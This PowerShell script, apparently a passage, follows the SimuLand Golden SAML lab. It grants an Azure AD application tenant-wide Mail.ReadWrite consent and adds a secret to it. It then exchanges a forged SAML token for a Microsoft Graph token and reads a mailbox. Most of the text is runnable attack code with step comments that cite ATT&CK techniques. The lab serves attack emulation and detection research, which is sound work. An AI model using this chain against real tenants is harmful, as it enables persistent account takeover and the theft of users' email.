$MSGraphAccessToken = $results.access_token


# USE PS APPLICATION TO GRANT PERMSISIONS TO APP
## Step 4: https://github.com/Azure/SimuLand/tree/main/labs/01_GoldenSAMLADFSMailAccess#4-grant-oauth-permissions-to-application---account-manipulation-exchange-email-delegate-permissions---t1098002

$headers = @{“Authorization” = “Bearer $MSGraphAccessToken”}
$params = @{
  “Method”  = “Get”
  “Uri”     = “https://graph.microsoft.com/v1.0/applications”
  “Headers” = $headers
}
$AzADApps = Invoke-RestMethod @params


$Application = $AzADApps.value | Where-Object {$_.displayName -eq "MyApplication"}
$Application
$resourceSpDisplayName = ‘Microsoft Graph’
$PropertyType = 'oauth2PermissionScopes'
$ResourceAccessType = 'Scope'
$permissions = @(‘Mail.ReadWrite’)

#Get Microsoft Graph Service Principal object to retrieve permissions from it.

$headers = @{“Authorization” = “Bearer $MSGraphAccessToken”}
$params = @{
    "Method" = "Get"
    "Uri" = "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=displayName eq '$resourceSpDisplayName'"
    "Headers" = $headers
}
$ResourceResults = Invoke-RestMethod @params
$ResourceSvcPrincipal = $ResourceResults.value[0]


if ($ResourceResults.value.Count -ne 1) {
    Write-Error "Found $($ResourceResults.value.Count) service principals with displayName '$($resourceSpDisplayName)'"
}

$ResourceSvcPrincipal

$ResourceAccessItems = @()
Foreach ($AppPermission in $permissions) {
    $RoleAssignment = $ResourceSvcPrincipal.$PropertyType | Where-Object { $_.Value -eq $AppPermission }
    $ResourceAccessItem = [PSCustomObject]@{
        "id" = $RoleAssignment.id
        "type" = $ResourceAccessType
    }
    $ResourceAccessItems += $ResourceAccessItem
}

$ResourceAccessItems
## Lets check if the premissions is already assigned to the Victim App ##

if ($resourceAccess = ($Application.requiredResourceAccess | Where-Object -FilterScript { $_.resourceAppId -eq $ResourceSvcPrincipal.appId })) {
    Foreach ($item in $ResourceAccessItems) {
        if ($null -eq ($resourceAccess.resourceAccess | Where-Object -FilterScript { $_.type -eq "$ResourceAccessType" -and $_.id -eq $item.id })) {
            $Application.requiredResourceAccess[$Application.requiredResourceAccess.resourceAppId.IndexOf($ResourceSvcPrincipal.appId)].resourceAccess += $item
         }
    }
}
else {
    $RequiredResourceAccess = [PSCustomObject]@{
        "resourceAppId" = $ResourceSvcPrincipal.appId
        "resourceAccess" = $ResourceAccessItems
    }
    # Update/Assign application permissions
    $Application.requiredResourceAccess += $RequiredResourceAccess
}

$Application.requiredResourceAccess

$AppBody = $Application | Select-Object -Property "id", "appId", "displayName", "identifierUris", "requiredResourceAccess"
$headers = @{
  “Authorization” = “Bearer $MSGraphAccessToken”
  "Content-Type" = "application/json"
}
$params = @{
    "Method" = "Patch"
    "Uri" = "https://graph.microsoft.com/v1.0/applications/$($AppBody.id)"
    "Body" = $AppBody | ConvertTo-Json -Compress -Depth 99
    "Headers" = $headers
}
$updatedApplication = Invoke-WebRequest @params -usebasicparsing
if ($updatedApplication.StatusCode -eq 204) {
    return "Required permissions were assigned successfully"
}

# PERMISSIONS WERE ADDED
# TIME TO GRANT PERMISSIONS

$headers = @{“Authorization” = “Bearer $MSGraphAccessToken”}
$params = @{
    "Method"  = "Get"
    "Uri"     = "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '$($Application.appId)'"
    "Headers" = $headers
}
$AzADAppSp = Invoke-RestMethod @params

$ServicePrincipalId = $AzADAppSp.value[0].id
$resourceSpDisplayName = ‘Microsoft Graph’
$PropertyType =  'oauth2PermissionScopes'
$permissions = @(‘Mail.ReadWrite’)

$headers = @{“Authorization” = “Bearer $MSGraphAccessToken”}
$params = @{
  "Method" = "Get"
  "Uri" = "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=displayName eq '$resourceSpDisplayName'"
  "Headers" = $headers
}
$ResourceSvcPrincipal = Invoke-RestMethod @params
if ($ResourceSvcPrincipal.value.Count -ne 1) {
  Write-Error "Found $($ResourceSvcPrincipal.value.Count) service principals with displayName '$($resourceSpDisplayName)'"
}

$body = @{
  clientId = $ServicePrincipalId
  consentType = "AllPrincipals"
  principalId = $null
  resourceId = $ResourceSvcPrincipal.value[0].id
  scope = "$permissions"
  startTime = "$((get-date).ToString("yyyy-MM-ddTHH:mm:ss:ffZ"))"
  expiryTime = "$((get-date).AddYears(1).ToString("yyyy-MM-ddTHH:mm:ss:ffZ"))"
}

$headers = @{
  “Authorization” = “Bearer $MSGraphAccessToken”
  "Content-Type" = "application/json"
}
$params = @{
  "Method" = "Post"
  "Uri" = “https://graph.microsoft.com/v1.0/oauth2PermissionGrants”
  "Body" = $body | ConvertTo-Json –Compress
  "Headers" = $headers
}
Invoke-RestMethod @params



# ADD CREDENTIALS

## Step 5: https://github.com/Azure/SimuLand/tree/main/labs/01_GoldenSAMLADFSMailAccess#5-add-credentials-to-oauth-application---account-manipulation-additional-cloud-credentials--t1098001

$headers = @{"Authorization" = "Bearer $MSGraphAccessToken"}
$params = @{
    "Method"  = "Get"
    "Uri"     = "https://graph.microsoft.com/v1.0/applications"
    "Headers" = $headers
}
$applications = Invoke-RestMethod @params
$applications
$appObjectId = ($applications.value | Where-Object {$_.displayName -eq "MyApplication"}).id
$appObjectId

$pwdCredentialName = 'SimuLand2021'
$headers = @{
    "Content-Type"  = "application/json"
    "Authorization" = "Bearer $MSGraphAccessToken"
}
$body = @{
    passwordCredential = @{ displayName = "$($pwdCredentialName)" }
}
$params = @{
    "Method"  = "Post"
    "Uri"     = "https://graph.microsoft.com/v1.0/applications/$appObjectId/addPassword"
    "Body"    = $body | ConvertTo-Json –Compress
    "Headers" = $headers
}
$credentials = Invoke-RestMethod @params
$credentials
$secret = $credentials.secretText
$secret


# GET MS GRAPH TOKEN FOR VICTIM APPLICATION
## Step 6: https://github.com/Azure/SimuLand/tree/main/labs/01_GoldenSAMLADFSMailAccess#6-request-access-token-with-saml-token---valid-accounts-cloud-accounts--t1078004

$headers = @{
    “Content-Type” = “application/x-www-form-urlencoded”
    "User-Agent" = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; Microsoft Outlook 16.0.4266)"
}

$headers = @{"Authorization" = "Bearer $MSGraphAccessToken"}
$params = @{
    "Method"  = "Get"
    "Uri"     = "https://graph.microsoft.com/v1.0/applications"
    "Headers" = $headers
}
$applications = Invoke-RestMethod @params
$applications

$applicationId = ($applications.value | Where-Object {$_.displayName -eq "MyApplication"}).appId

# Get MS Graph Access token from the Victim Application (SimuLandAPP)
$body = @{
    client_id = $applicationId
    client_secret = $secret
    scope = 'https://graph.microsoft.com/.default'
    assertion = $encodedSamlToken
    grant_type = 'urn:ietf:params:oauth:grant-type:saml1_1-bearer'
}
$body

$TenantId = 'CHANGE-ME'
$TokenUrl = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
$params = @{
    "Method"="Post"
    "Uri"=$TokenUrl
    "Body"=$body
    "Headers"=$headers
}
$results = $(Invoke-RestMethod @params)
$results

$SimulandAppMSGraphAccessToken = $results.access_token

# READ MEAIL

## Step 7: https://github.com/Azure/SimuLand/tree/main/labs/01_GoldenSAMLADFSMailAccess#7-access-account-mailbox-via-graph-api

$uri = "https://graph.microsoft.com/v1.0/me/messages"
$header = @{Authorization = "Bearer $SimulandAppMSGraphAccessToken"}
$mailbox = Invoke-RestMethod –Uri $uri –Headers $Header –Method GET –ContentType "application/json"

## Example Email
$mailbox.value[0]